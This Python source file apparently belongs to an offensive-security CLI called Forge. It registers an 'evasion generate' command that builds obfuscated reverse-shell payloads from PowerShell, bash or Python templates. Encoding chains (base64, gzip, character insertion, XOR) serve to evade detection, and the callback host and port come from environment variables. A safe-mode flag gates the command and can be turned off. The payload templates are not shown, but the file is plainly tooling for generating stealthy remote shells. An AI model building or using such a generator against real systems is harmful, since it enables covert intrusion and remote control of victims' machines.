"""Evasion command registration for the Forge CLI."""

from __future__ import annotations

import os

import typer
from rich.console import Console

from forge.config import ForgeConfig


def register_evasion_commands(evasion_app: typer.Typer, *, console: Console) -> None:
    """Register Phase 3 evasion commands on the evasion sub-app."""

    @evasion_app.command("generate")
    def evasion_generate(
        engagement: str = typer.Option(..., "--engagement", "-e"),
        technique: str = typer.Option(..., "--technique", help="Obfuscation technique identifier."),
        target_os: str = typer.Option("windows", "--os", help="windows|linux|macos"),
        strip_metadata: bool = typer.Option(True, "--strip-metadata/--no-strip-metadata"),
    ) -> None:
        """Generate an obfuscated payload using the 6-criterion matrix (Phase 3)."""
        from forge.config import is_offensive_enabled, prompt_offensive_upgrade  # noqa: PLC0415

        if not is_offensive_enabled():
            if not prompt_offensive_upgrade("Phase 3 payload generation"):
                console.print(
                    "[bold red]ERROR:[/bold red] Phase 3 payload generation is disabled "
                    "(FORGE_SAFE_MODE=1). Set FORGE_SAFE_MODE=0 to enable offensive modules."
                )
                raise typer.Exit(code=1)

        from forge.phase3.payload_builder import EncodingChain, PayloadBuilder  # noqa: PLC0415

        cfg = ForgeConfig.load()
        out_dir = cfg.templates_dir(engagement)
        out_dir.mkdir(parents=True, exist_ok=True)

        os_key = (target_os or "windows").strip().lower()
        template_by_os = {
            "windows": "powershell_reverse.j2",
            "linux": "bash_reverse.j2",
            "macos": "python_reverse.j2",
        }
        template_name = template_by_os.get(os_key)
        if template_name is None:
            console.print(f"[bold red]ERROR:[/bold red] Unsupported target OS: {target_os!r}")
            raise typer.Exit(code=1)

        chain = EncodingChain()
        technique_key = (technique or "").strip().lower()
        steps_by_technique = {
            "ps_obf": ["base64", "char_insert"],
            "bash_obf": ["gzip_b64", "char_insert"],
            "py_obf": ["base64", "xor"],
            "std": ["base64"],
        }
        for step in steps_by_technique.get(technique_key, ["base64"]):
            chain.add(step)

        lhost = os.environ.get("FORGE_LHOST", "127.0.0.1")
        lport = int(os.environ.get("FORGE_LPORT", "443"))

        builder = PayloadBuilder(
            obfuscate=True,
            stealth_level=4 if strip_metadata else 3,
        )
        payload = builder.build(
            template_name=template_name,
            context={"lhost": lhost, "lport": lport},
            chain=chain,
            lport=lport,
        )
        output_path = out_dir / f"phase3_{technique_key or 'std'}_{os_key}.txt"
        sha256 = builder.write_payload(payload, output_path=output_path, use_encoded=True)
        console.print(f"[green]Payload generated:[/green] {output_path}")
        console.print(f"[green]SHA256:[/green] {sha256}")
